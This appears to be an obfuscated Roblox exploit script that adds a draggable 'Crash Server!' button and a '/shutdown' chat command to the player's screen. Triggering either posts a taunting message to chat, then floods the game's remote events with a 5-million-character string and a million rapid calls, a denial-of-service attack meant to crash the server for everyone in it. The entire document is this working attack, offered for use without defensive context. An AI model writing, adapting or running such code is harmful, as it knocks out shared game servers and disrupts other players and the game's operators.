local _0xD797 =[[meow]]print("|".. (_0xD797:gsub("\n","\n|")))
local _0xDF14 = game:GetService("ReplicatedStorage")
local _0x23F0 = game:GetService("Players")
local _0xD532 = game:GetService("TextChatService")
local _0xB4E6 = _0x23F0.LocalPlayer
local _0x8D9B = _0xB4E6:WaitForChild("PlayerGui")
local _0x83D4 = _0xDF14.DataEvents.UpdateTexturesChoice
local _0x8C7D = _0xDF14.DataEvents.DataRemoteEvent
local _0x9977 = string.rep("A", 5e6)
local function _0x2B8D()
local _0x7F8D = pcall(function()
local _0xC6D6 = _0xD532:FindFirstChild("TextChannels")
and _0xD532.TextChannels:FindFirstChild("RBXGeneral")
if _0xC6D6 then
_0xC6D6:SendAsync("Shutting down server ^w^ - fembco")
end
end)
if not _0x7F8D then
local _0xEDD9 = _0xDF14:FindFirstChild("DefaultChatSystemChatEvents")
and _0xDF14.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
if _0xEDD9 then
_0xEDD9:FireServer("Shutting down server ^w^ - fembco","All")
end
end
end
local function _0x0FA7()
_0x2B8D()
for _ = 1, 3 do
_0x83D4:FireServer(_0x9977)
end
for _ = 1, 1e6 do
_0x8C7D:FireServer()
end
end
local _0xC1DF = Instance.new("ScreenGui")
_0xC1DF.Name ="CrashGui"_0xC1DF.ResetOnSpawn = false
_0xC1DF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_0xC1DF.Parent = _0x8D9B
local _0x3EEC = Instance.new("Frame")
_0x3EEC.Name ="Panel"_0x3EEC.Size = UDim2.new(0, 160, 0, 60)
_0x3EEC.Position = UDim2.new(0, 20, 0.5, -30)
_0x3EEC.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
_0x3EEC.BorderSizePixel = 0
_0x3EEC.Active = true
_0x3EEC.Draggable = true
_0x3EEC.Parent = _0xC1DF
local _0x053B = Instance.new("UICorner")
_0x053B.CornerRadius = UDim.new(0, 8)
_0x053B.Parent = _0x3EEC
local _0x8520 = Instance.new("UIStroke")
_0x8520.Color = Color3.fromRGB(200, 40, 40)
_0x8520.Thickness = 1.5
_0x8520.Parent = _0x3EEC
local _0xC912 = Instance.new("TextLabel")
_0xC912.Size = UDim2.new(1, 0, 0, 20)
_0xC912.Position = UDim2.new(0, 0, 0, 4)
_0xC912.BackgroundTransparency = 1
_0xC912.Text ="meow"_0xC912.TextColor3 = Color3.fromRGB(200, 40, 40)
_0xC912.Font = Enum.Font.GothamBold
_0xC912.TextSize = 12
_0xC912.Parent = _0x3EEC
local _0xA266 = Instance.new("TextButton")
_0xA266.Name ="CrashBtn"_0xA266.Size = UDim2.new(1, -20, 0, 28)
_0xA266.Position = UDim2.new(0, 10, 0, 26)
_0xA266.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
_0xA266.BorderSizePixel = 0
_0xA266.Text ="Crash Server!"_0xA266.TextColor3 = Color3.fromRGB(255, 255, 255)
_0xA266.Font = Enum.Font.GothamBold
_0xA266.TextSize = 13
_0xA266.AutoButtonColor = true
_0xA266.Parent = _0x3EEC
local _0x5487 = Instance.new("UICorner")
_0x5487.CornerRadius = UDim.new(0, 6)
_0x5487.Parent = _0xA266
_0xA266.MouseButton1Click:Connect(_0x0FA7)
_0xB4E6.Chatted:Connect(function(msg)
if msg:lower() =="/shutdown"then
_0x0FA7()
end
end)
